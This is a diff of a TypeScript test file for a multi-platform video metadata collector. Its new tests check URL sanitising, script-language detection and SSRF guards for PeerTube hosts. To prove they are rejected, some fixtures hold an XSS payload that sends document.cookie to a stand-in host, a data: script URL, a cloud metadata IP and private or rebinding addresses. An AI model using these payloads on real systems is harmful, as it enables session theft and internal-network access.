@@ -5,22 +5,41 @@
  */
 import { readFileSync } from 'node:fs';
 import { fileURLToPath } from 'node:url';
-import { describe, expect, it } from 'vitest';
+import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import type { CollectContext, CollectLogger, HttpClient, RawVideo, Seeds, SourceAdapter } from '../src/types.ts';
-import { youtubeRss, parseYoutubeFeed, likesFromStarRating, youtubeFeedUrl } from '../src/sources/youtube-rss.ts';
+import {
+  youtubeRss,
+  parseYoutubeFeed,
+  likesFromStarRating,
+  youtubeFeedUrl,
+  youtubePlaylistFeedUrl,
+  uploadsPlaylists,
+  entryLanguage,
+  CONSECUTIVE_FAILURE_LIMIT,
+} from '../src/sources/youtube-rss.ts';
 import {
   dailymotion,
   dailymotionIdsUrl,
+  dailymotionGlobalLocalization,
   dailymotionWindows,
   DAILYMOTION_FIELDS,
 } from '../src/sources/dailymotion.ts';
-import { peertube, parsePeertubePlatformId, peertubePlatformId } from '../src/sources/peertube.ts';
-import { niconico, NICONICO_FIELDS } from '../src/sources/niconico.ts';
+import {
+  peertube,
+  isNonPublicAddress,
+  isPublicHostName,
+  parsePeertubePlatformId,
+  peertubePlatformId,
+  peertubeToRawVideo,
+  setPeertubeHostResolver,
+} from '../src/sources/peertube.ts';
+import { niconico, niconicoTags, niconicoToRawVideo, NICONICO_FIELDS } from '../src/sources/niconico.ts';
 import {
   RequestBudget,
   USER_AGENT,
   chunk,
   cleanDescription,
+  declaredLanguageConflicts,
   decodeEntities,
   detectLanguage,
   detectScriptLanguage,
@@ -30,6 +49,7 @@ import {
   normalizeLanguage,
   parseTime,
   safeCount,
+  safeHttpUrl,
   safeNumber,
   stripHtml,
   truncate,
@@ -231,6 +251,33 @@ describe('util', () => {
     expect(httpStatusOf(new Error('ECONNRESET'))).toBeNull();
   });
 
+  it('safeHttpUrl keeps only absolute http(s) URLs', () => {
+    expect(safeHttpUrl('https://example.org/a?b=1')).toBe('https://example.org/a?b=1');
+    expect(safeHttpUrl('http://example.org')).toBe('http://example.org');
+    expect(safeHttpUrl('javascript:alert(1)')).toBeNull();
+    expect(safeHttpUrl('JavaScript:fetch("//evil.example/?c="+document.cookie)//')).toBeNull();
+    expect(safeHttpUrl('data:text/html,<script>1</script>')).toBeNull();
+    expect(safeHttpUrl('/relative/path')).toBeNull();
+    expect(safeHttpUrl('https://user:pw@example.org/x')).toBe('https://example.org/x');
+    expect(safeHttpUrl(null)).toBeNull();
+    expect(safeHttpUrl(42)).toBeNull();
+  });
+
+  it('declaredLanguageConflicts flags ko/ja declarations on text written in another script', () => {
+    expect(declaredLanguageConflicts('ko', 'Népal : les images par satellite des coulées de boue')).toBe(true);
+    expect(declaredLanguageConflicts('ko', 'Jacopo Amigoni', 'alcune pitture a carattere mitologico')).toBe(true);
+    expect(declaredLanguageConflicts('ko', '명일방주 PA-6')).toBe(false);
+    expect(declaredLanguageConflicts('ko', 'BTS 🎉 2026')).toBe(false); // too few Latin letters to judge
+    expect(declaredLanguageConflicts('ko', '豆乳丸子蛋挞', '烤好的蛋挞淋上豆乳酱')).toBe(true); // Chinese declared as ko
+    expect(declaredLanguageConflicts('ko', 'Прайд в Южной Корее')).toBe(true);
+    expect(declaredLanguageConflicts('ko', 'IMG_5715')).toBe(false);
+    expect(declaredLanguageConflicts('ko', 'Jung Kook decodes the olfactory notes', '샤넬 향수')).toBe(false); // Korean tags count
+    expect(declaredLanguageConflicts('ja', '東京 night walk in the rain')).toBe(false); // Han present
+    expect(declaredLanguageConflicts('ja', 'Starkregen, warmes Essen')).toBe(true);
+    expect(declaredLanguageConflicts('en', 'anything at all here')).toBe(false);
+    expect(declaredLanguageConflicts(null, 'anything at all here')).toBe(false);
+  });
+
   it('chunks arrays', () => {
     expect(chunk([1, 2, 3, 4, 5], 2)).toEqual([[1, 2], [3, 4], [5]]);
     expect(chunk([], 100)).toEqual([]);
@@ -384,11 +431,23 @@ describe('youtube-rss', () => {
     const http = new FakeHttp(ytRoutes({ [BLACKPINK.channelId]: () => latinOnly }));
     const seed = { ...BLACKPINK, language: 'en' };
     const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [seed] } }));
+    // the seed language is a hint, not a detection: kept, but without a provenance label
     expect(res.videos.map((v) => [v.language, v.languageSource])).toEqual([
-      ['en', 'detected'],
-      ['en', 'detected'],
-      ['en', 'detected'],
+      ['en', null],
+      ['en', null],
+      ['en', null],
     ]);
+    // a ko seed on Latin-only text (e.g. Arirang News in English) is not applied
+    const koSeed = await youtubeRss.collect(
+      makeCtx(new FakeHttp(ytRoutes({ [BLACKPINK.channelId]: () => latinOnly })), { seeds: { youtubeChannels: [BLACKPINK] } }),
+    );
+    expect(koSeed.videos.map((v) => [v.language, v.languageSource])).toEqual([
+      [null, null],
+      [null, null],
+      [null, null],
+    ]);
+    expect(entryLanguage('Iran says no talks planned as Trump expects more negotiations', null, 'ko')).toEqual({ language: null, languageSource: null });
+    expect(entryLanguage('뉴스 속보', null, 'en')).toEqual({ language: 'ko', languageSource: 'detected' });
     const noLang = await youtubeRss.collect(
       makeCtx(new FakeHttp(ytRoutes({ [BLACKPINK.channelId]: () => latinOnly })), {
         seeds: { youtubeChannels: [{ ...BLACKPINK, language: null }] },
@@ -457,6 +516,63 @@ describe('youtube-rss', () => {
     expect(res.accounts).toHaveLength(1);
     expect(res.accounts[0]).toMatchObject({ platformId: 'UCempty', name: 'Empty Channel', seedCategory: 'news' });
     expect(res.gone ?? []).toEqual([]);
+  });
+
+  it('reads the long-form and Shorts playlists of fast channels and merges them by video id', async () => {
+    const DAY = 86_400_000;
+    const entry = (id: string, hoursAgo: number, link: 'watch' | 'shorts' = 'watch', channel = PAIK.channelId) =>
+      `<entry><id>yt:video:${id}</id><yt:videoId>${id}</yt:videoId><yt:channelId>${channel}</yt:channelId><title>영상 ${id}</title>` +
+      `<link rel="alternate" href="https://www.youtube.com/${link === 'shorts' ? `shorts/${id}` : `watch?v=${id}`}"/>` +
+      `<published>${new Date(NOW - hoursAgo * 3_600_000).toISOString()}</published>` +
+      `<media:group><media:community><media:starRating count="3" average="5.00" min="1" max="5"/><media:statistics views="${100 + hoursAgo}"/></media:community></media:group></entry>`;
+    const feed = (entries: string[]) =>
+      `<?xml version="1.0" encoding="UTF-8"?><feed xmlns:yt="http://www.youtube.com/xml/schemas/2015" xmlns:media="http://search.yahoo.com/mrss/" xmlns="http://www.w3.org/2005/Atom"><title>Fast</title><author><name>Fast Channel</name></author>${entries.join('')}</feed>`;
+    // 15 uploads within 15 hours: a fast channel
+    const channelFeed = feed(Array.from({ length: 15 }, (_, i) => entry(`c${i}`, i, i % 2 ? 'watch' : 'shorts')));
+    const lists = uploadsPlaylists(PAIK.channelId)!;
+    expect(lists).toEqual({ long: `UULF${PAIK.channelId.slice(2)}`, shorts: `UUSH${PAIK.channelId.slice(2)}` });
+    const longFeed = feed([entry('c1', 1), entry('old-long', 40), entry('foreign', 2, 'watch', 'UCxxxxxxxxxxxxxxxxxxxxxx')]);
+    const shortsFeed = feed([entry('c1', 1), entry('old-short', 90)]);
+    const http = new FakeHttp([
+      {
+        name: 'feeds',
+        match: (u) => u.pathname === '/feeds/videos.xml',
+        reply: (u) => {
+          if (u.searchParams.get('channel_id') === PAIK.channelId) return channelFeed;
+          if (u.searchParams.get('channel_id') === BLACKPINK.channelId) return fx('youtube-rss-blackpink.xml');
+          if (u.searchParams.get('playlist_id') === lists.long) return longFeed;
+          if (u.searchParams.get('playlist_id') === lists.shorts) return shortsFeed;
+          return httpError(404, '');
+        },
+      },
+    ]);
+    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [PAIK, BLACKPINK] } }));
+    expect(res.errors).toEqual([]);
+    // both channel feeds first, then the playlists of the one fast channel (BLACKPINK's 3-entry feed is not full)
+    expect(http.calls.map((c) => c.url)).toEqual([
+      youtubeFeedUrl(PAIK.channelId),
+      youtubeFeedUrl(BLACKPINK.channelId),
+      youtubePlaylistFeedUrl(lists.long),
+      youtubePlaylistFeedUrl(lists.shorts),
+    ]);
+    expect(res.videos).toHaveLength(15 + 3 + 2); // + old-long, old-short; 'foreign' (another channel) ignored
+    expect(byId(res.videos, 'old-long')).toMatchObject({ format: 'long', discoveredVia: `seed-channel:${PAIK.channelId}`, counters: { views: 140 } });
+    expect(byId(res.videos, 'old-short').format).toBe('short');
+    // playlist membership overrides the /shorts/ link heuristic
+    expect(byId(res.videos, 'c1').format).toBe('short');
+    expect(byId(res.videos, 'c2').format).toBe('short'); // link heuristic (not in the playlists read)
+    expect(res.videos.some((v) => v.platformId === 'foreign')).toBe(false);
+    expect(DAY).toBeGreaterThan(0);
+  });
+
+  it('stops after consecutive network errors / 429 / 5xx and returns what it has', async () => {
+    const seeds = Array.from({ length: CONSECUTIVE_FAILURE_LIMIT + 5 }, (_, i) => ({ ...MISSING, channelId: `UCthrottled${i}` }));
+    const http = new FakeHttp(ytRoutes(Object.fromEntries(seeds.map((sd) => [sd.channelId, () => httpError(429, 'Too Many Requests')]))));
+    const res = await youtubeRss.collect(makeCtx(http, { seeds: { youtubeChannels: [PAIK, ...seeds, BLACKPINK] } }));
+    expect(http.requestCount).toBe(1 + CONSECUTIVE_FAILURE_LIMIT);
+    expect(res.videos).toHaveLength(2); // PAIK only
+    expect(res.errors[res.errors.length - 1]).toMatch(/연속 10회/);
+    expect(res.errors[res.errors.length - 1]).toContain('6개 미수집');
   });
 
   it('parseYoutubeFeed returns null for non-feeds and tolerates missing fields', () => {
@@ -647,8 +763,21 @@ describe('dailymotion', () => {
     expect(u.searchParams.get('language')).toBe('ko');
     expect(u.searchParams.has('country')).toBe(false);
     expect(res.videos).toHaveLength(3);
-    for (const v of res.videos) expect(v.discoveredVia).toBe('dailymotion:relevance:global:search');
+    // country-less seeds carry a fixed localization so results do not follow the collector's location
+    expect(u.searchParams.get('localization')).toBe('en_US');
+    for (const v of res.videos) expect(v.discoveredVia).toBe('dailymotion:relevance:loc-en_US:search');
     expect(byId(res.videos, 'x6klj8f').sourceCategory).toBe('dailymotion:fun');
+  });
+
+  it('country seeds send no localization; the global localization is configurable', async () => {
+    const http = new FakeHttp(dmRoutes());
+    await dailymotion.collect(makeCtx(http, { env: { DAILYMOTION_GLOBAL_LOCALIZATION: 'fr_FR' }, seeds: { dailymotion: [DM_KR, DM_SEARCH] } }));
+    const [kr, global] = http.urls();
+    expect(kr.searchParams.has('localization')).toBe(false);
+    expect(global.searchParams.get('localization')).toBe('fr_FR');
+    expect(dailymotionGlobalLocalization({})).toBe('en_US');
+    expect(dailymotionGlobalLocalization({ DAILYMOTION_GLOBAL_LOCALIZATION: 'nonsense; drop' })).toBe('en_US');
+    expect(dailymotionGlobalLocalization({ DAILYMOTION_GLOBAL_LOCALIZATION: 'ja_JP' })).toBe('ja_JP');
   });
 
   it('paginates only as far as the seed limit allows (page size ≤ 100)', async () => {
@@ -782,7 +911,29 @@ describe('dailymotion', () => {
     );
     expect(http.requestCount).toBe(2);
     expect(res.errors.some((e) => e.includes('maxRequests=2'))).toBe(true);
-    expect(res.errors.some((e) => e.includes('미갱신'))).toBe(true);
+    // refresh ids left over for lack of budget are not an error: the pipeline notes how many due videos waited
+    expect(http.urls().some((u) => u.searchParams.has('ids'))).toBe(false);
+  });
+
+  it('probes the missing ids of each batch before the next batch uses the budget', async () => {
+    const ids = Array.from({ length: 150 }, (_, i) => `xq${i}`);
+    const http = new FakeHttp(
+      dmRoutes([
+        {
+          name: 'batch',
+          match: (u) => u.pathname === '/videos' && u.searchParams.has('ids'),
+          // every batch silently drops its first id
+          reply: (u) => ({ has_more: false, list: u.searchParams.get('ids')!.split(',').slice(1).map((id) => dmItem(id)) }),
+        },
+        { name: 'probe', match: (u) => u.pathname.startsWith('/video/'), reply: () => httpError(404, fx('dailymotion-video-404.json')) },
+      ]),
+    );
+    const res = await dailymotion.collect(makeCtx(http, { maxRequests: 3, refreshIds: ids }));
+    expect(http.urls().map((u) => (u.searchParams.has('ids') ? 'batch' : u.pathname))).toEqual(['batch', '/video/xq0', 'batch']);
+    expect(res.gone).toEqual([
+      { platformId: 'xq0', status: 'deleted' },
+      { platformId: 'xq100', status: 'unknown' },
+    ]);
   });
 });
 
@@ -817,6 +968,10 @@ function ptRoutes(extra: Route[] = []): Route[] {
 }
 
 describe('peertube', () => {
+  // No real DNS in unit tests: every fixture host resolves to a public address unless a test says otherwise.
+  beforeAll(() => setPeertubeHostResolver(async () => ['93.184.216.34']));
+  afterAll(() => setPeertubeHostResolver(null));
+
   it('declares an accurate contract', () => {
     expectAdapterContract(peertube, 'peertube', 'peertube');
     expect(peertube.metrics).toEqual(['views', 'likes', 'comments']);
@@ -825,15 +980,54 @@ describe('peertube', () => {
   it('platform id scheme <uuid>@<host> round-trips', () => {
     expect(peertubePlatformId(ONAIR, 'OnAir.SBS')).toBe(`${ONAIR}@onair.sbs`);
     expect(parsePeertubePlatformId(`${ONAIR}@onair.sbs`)).toEqual({ uuid: ONAIR, host: 'onair.sbs' });
-    expect(parsePeertubePlatformId(`${ONAIR}@peertube.example:8443`)).toEqual({ uuid: ONAIR, host: 'peertube.example:8443' });
     expect(parsePeertubePlatformId(ONAIR)).toBeNull();
     expect(parsePeertubePlatformId('not-a-uuid@host')).toBeNull();
     expect(parsePeertubePlatformId(`${ONAIR}@evil.host/path`)).toBeNull();
+    // only public host names: no ports, IP literals, localhost, single labels or internal suffixes
+    for (const host of ['peertube.example:8443', '169.254.169.254', '192.168.0.1', 'localhost', 'intranet', 'tube.local', 'svc.internal', '[::1]']) {
+      expect(parsePeertubePlatformId(`${ONAIR}@${host}`)).toBeNull();
+      expect(isPublicHostName(host)).toBe(false);
+    }
+    expect(isPublicHostName('xn--9t4b11yi5a.com')).toBe(true);
+  });
+
+  it('never takes javascript: URLs or private hosts from instance data', async () => {
+    const base = fxJson('peertube-sepia-ko-recent.json').data[0];
+    const evil = peertubeToRawVideo(
+      { ...base, url: 'javascript:fetch("//evil.example/?c="+document.cookie)//', account: { ...base.account, url: 'javascript:alert(1)' }, thumbnailUrl: 'javascript:alert(2)' },
+      NOW,
+      'test',
+    )!;
+    expect(evil.url).toBe(`https://onair.sbs/videos/watch/${ONAIR}`);
+    expect(evil.account.url).toBe('https://onair.sbs/accounts/vallisneria');
+    expect(evil.thumbnail).toBeNull();
+    // a watch URL on another host than the channel's is not trusted
+    expect(peertubeToRawVideo({ ...base, url: `https://other.example/videos/watch/${ONAIR}` }, NOW, 'test')!.url).toBe(`https://onair.sbs/videos/watch/${ONAIR}`);
+    // hosts that are IP literals / internal names are rejected outright
+    const ipHost = { ...base, url: `https://169.254.169.254/videos/watch/${ONAIR}`, channel: { ...base.channel, host: '169.254.169.254' }, account: { ...base.account, host: '169.254.169.254', url: null } };
+    expect(peertubeToRawVideo(ipHost, NOW, 'test')).toBeNull();
+
+    // DNS names that resolve to private / loopback addresses are never requested
+    expect(isNonPublicAddress('127.0.0.1')).toBe(true);
+    expect(isNonPublicAddress('10.0.0.8')).toBe(true);
+    expect(isNonPublicAddress('::ffff:192.168.1.1')).toBe(true);
+    expect(isNonPublicAddress('fd12::1')).toBe(true);
+    expect(isNonPublicAddress('172.67.160.69')).toBe(false);
+    expect(isNonPublicAddress('2606:4700::6810:84e5')).toBe(false);
+    setPeertubeHostResolver(async (host) => (host === 'rebind.example' ? ['127.0.0.1'] : ['93.184.216.34']));
+    try {
+      const http = new FakeHttp(ptRoutes());
+      const res = await peertube.collect(makeCtx(http, { refreshIds: [`${ONAIR}@rebind.example`, `${ONAIR}@onair.sbs`] }));
+      expect(http.urls().map((u) => u.host)).toEqual(['onair.sbs']);
+      expect(res.errors.join('\n')).toContain('내부·사설 주소');
+    } finally {
+      setPeertubeHostResolver(async () => ['93.184.216.34']);
+    }
   });
 
   it('builds SepiaSearch URLs: no empty search param, languageOneOf[], nsfw=false', async () => {
     const http = new FakeHttp(ptRoutes());
-    const res = await peertube.collect(makeCtx(http, { seeds: { peertube: [PT_KO, { ...PT_KO, search: '요리', sort: '-views' }] } }));
+    const res = await peertube.collect(makeCtx(http, { maxRequests: 2, seeds: { peertube: [PT_KO, { ...PT_KO, search: '요리', sort: '-views' }] } }));
     expect(res.errors).toEqual([]);
     const [a, b] = http.urls();
     expect(`${a.origin}${a.pathname}`).toBe('https://sepiasearch.org/api/v1/search/videos');
@@ -847,11 +1041,16 @@ describe('peertube', () => {
     expect(b.searchParams.get('sort')).toBe('-views');
   });
 
-  it('maps real SepiaSearch items (comments present -> value, absent -> null)', async () => {
+  it('maps real SepiaSearch items as metadata and takes counters only from the origin instance', async () => {
     const http = new FakeHttp(ptRoutes());
     const res = await peertube.collect(makeCtx(http, { seeds: { peertube: [PT_KO] } }));
     expect(res.errors).toEqual([]);
     expect(res.videos).toHaveLength(4);
+    // one SepiaSearch page, then every discovered video's origin instance (newest first)
+    expect(http.urls()[0].host).toBe('sepiasearch.org');
+    expect(new Set(http.urls().slice(1).map((u) => u.host))).toEqual(new Set(['onair.sbs', 'tube.blueben.net', 'tube.xy-space.de', 'makertube.net']));
+    expect(http.urls().slice(1).every((u) => u.pathname.startsWith('/api/v1/videos/'))).toBe(true);
+    expect(http.requestCount).toBe(5);
 
     const onair = byId(res.videos, `${ONAIR}@onair.sbs`);
     expect(onair).toMatchObject({
@@ -877,7 +1076,7 @@ describe('peertube', () => {
       name: '발리스네리아',
       url: 'https://onair.sbs/accounts/vallisneria',
       country: null,
-      followers: null, // SepiaSearch does not return follower counts
+      followers: 2, // from the origin API (SepiaSearch does not return follower counts)
     });
 
     const blueben = byId(res.videos, `${BLUEBEN}@tube.blueben.net`);
@@ -888,7 +1087,35 @@ describe('peertube', () => {
     const shortClip = byId(res.videos, '2daeb3a6-a216-4631-a3c0-0b74a5ddf8ab@tube.xy-space.de');
     expect(shortClip.format).toBe('short'); // 11 s
     expect(shortClip.durationSec).toBe(11);
-    expect(byId(res.videos, '7846f6da-6532-4d27-932e-2c74464b8d96@makertube.net').sourceCategory).toBe('peertube:Entertainment');
+    // its origin answered 404 (fixture): no counters from the stale index, metadata only
+    expect(shortClip.counters).toEqual({ views: null, likes: null, comments: null, shares: null });
+    // declared "ko" on a Spanish title: the declaration is not trusted
+    expect([shortClip.language, shortClip.languageSource]).toEqual([null, null]);
+    const italian = byId(res.videos, '7846f6da-6532-4d27-932e-2c74464b8d96@makertube.net');
+    expect(italian.sourceCategory).toBe('peertube:Entertainment');
+    expect(italian.language).toBeNull();
+    expect(onair.discoveredVia).toBe('peertube:sepia:-publishedAt:ko'); // discovery path kept for origin-read videos
+  });
+
+  it('a stale SepiaSearch copy never becomes an observation, and due ids go to the origin first', async () => {
+    const http = new FakeHttp(ptRoutes());
+    // budget: 1 SepiaSearch page + 1 origin request
+    const res = await peertube.collect(makeCtx(http, { maxRequests: 2, refreshIds: [`${BLUEBEN}@tube.blueben.net`], seeds: { peertube: [PT_KO] } }));
+    expect(http.urls().map((u) => u.host)).toEqual(['sepiasearch.org', 'tube.blueben.net']);
+    const withCounters = res.videos.filter((v) => v.counters.views !== null);
+    expect(withCounters.map((v) => v.platformId)).toEqual([`${BLUEBEN}@tube.blueben.net`]);
+    expect(res.videos).toHaveLength(4); // the other three: metadata only
+    expect(res.errors).toEqual([]);
+  });
+
+  it('skips an instance after repeated network failures', async () => {
+    const ids = [1, 2, 3, 4].map((i) => `${i}${i}${i}${i}${i}${i}${i}${i}-1111-4111-8111-111111111111@down.example`);
+    const http = new FakeHttp(ptRoutes());
+    const res = await peertube.collect(makeCtx(http, { refreshIds: [...ids, `${ONAIR}@onair.sbs`] }));
+    expect(http.urls().map((u) => u.host)).toEqual(['down.example', 'down.example', 'onair.sbs']);
+    expect(res.errors.join('\n')).toContain('down.example');
+    expect(res.errors.join('\n')).toContain('2개는 이번 실행에서 건너뜀');
+    expect(res.videos.map((v) => v.platformId)).toEqual([`${ONAIR}@onair.sbs`]);
   });
 
   it('paginates (count ≤ 100) and stops at the seed limit or the end of results', async () => {
@@ -907,7 +1134,8 @@ describe('peertube', () => {
         },
       ]),
     );
-    const res = await peertube.collect(makeCtx(http, { seeds: { peertube: [{ ...PT_KO, limit: 150 }] } }));
+    // budget for the two SepiaSearch pages only: the origin instances are not read here
+    const res = await peertube.collect(makeCtx(http, { maxRequests: 2, seeds: { peertube: [{ ...PT_KO, limit: 150 }] } }));
     expect(http.urls().map((u) => [u.searchParams.get('start'), u.searchParams.get('count')])).toEqual([
       ['0', '100'],
       ['100', '50'],
@@ -916,7 +1144,7 @@ describe('peertube', () => {
     expect(res.videos).toHaveLength(150);
 
     const short = new FakeHttp(ptRoutes());
-    const r2 = await peertube.collect(makeCtx(short, { seeds: { peertube: [{ ...PT_KO, limit: 50 }] } }));
+    const r2 = await peertube.collect(makeCtx(short, { maxRequests: 1, seeds: { peertube: [{ ...PT_KO, limit: 50 }] } }));
     expect(short.requestCount).toBe(1); // only 4 results < count -> no second page
     expect(r2.videos).toHaveLength(4);
   });
@@ -958,7 +1186,7 @@ describe('peertube', () => {
     ]);
     expect(res.errors).toHaveLength(2);
     expect(res.errors[0]).toContain('HTTP 502');
-    expect(res.errors[1]).toContain('<uuid>@<host>');
+    expect(res.errors[1]).toContain('<uuid>@<공개 호스트>');
   });
 
   it('SepiaSearch 400 is reported and the next seed still runs; budget is respected', async () => {
@@ -983,9 +1211,10 @@ describe('peertube', () => {
       }),
     );
     expect(tight.requestCount).toBe(2);
-    // the discovery already observed ONAIR, so only the other id needed a refresh request
-    expect(tight.urls().map((u) => u.host)).toEqual(['sepiasearch.org', 'onair.sbs']);
-    expect(r2.gone).toEqual([{ platformId: '00000000-0000-4000-8000-000000000000@onair.sbs', status: 'deleted' }]);
+    // due ids go to the origin in priority order even when discovery listed them (its counters are stale)
+    expect(tight.urls().map((u) => u.href)).toEqual([expect.stringContaining('sepiasearch.org'), `https://onair.sbs/api/v1/videos/${ONAIR}`]);
+    expect(byId(r2.videos, `${ONAIR}@onair.sbs`).counters.views).toBe(1);
+    expect(r2.gone).toEqual([]);
     expect(r2.errors).toEqual([]);
 
     const tighter = new FakeHttp(ptRoutes());
@@ -998,7 +1227,6 @@ describe('peertube', () => {
     );
     expect(tighter.requestCount).toBe(1);
     expect(r3.errors.join('\n')).toContain('maxRequests=1');
-    expect(r3.errors.join('\n')).toContain('미갱신');
   });
 });
 
@@ -1112,6 +1340,15 @@ describe('niconico', () => {
     expect(ch.account).toMatchObject({ platformId: 'channel/2650159', name: 'niconico 채널 2650159', url: 'https://ch.nicovideo.jp/ch2650159' });
     expect(ch.counters).toEqual({ views: 272520, likes: 5390, comments: 60434, shares: null });
     expect(ch.discoveredVia).toBe('niconico:tag:アニメ');
+  });
+
+  it('decodes the HTML entities the API leaves in titles and tags', () => {
+    const row = { ...fxJson('niconico-search-game.json').data[0], title: '#133【プラモデル解説】&quot;HG ヒュッケバイン&quot; ドラクエ1&amp;2', tags: 'ゲーム R&amp;B zebra&#32;coffee' };
+    const v = niconicoToRawVideo(row, SNAPSHOT_AT, 'niconico:tag:ゲーム')!;
+    expect(v.title).toBe('#133【プラモデル解説】"HG ヒュッケバイン" ドラクエ1&2');
+    expect(v.tags).toEqual(['ゲーム', 'R&B', 'zebra coffee']);
+    expect(niconicoTags(['a&amp;b', 'c'])).toEqual(['a&b', 'c']);
+    expect(v.language).toBe('ja');
   });
 
   it('classifies short videos by lengthSeconds ≤ 60 and keeps missing counters null', async () => {
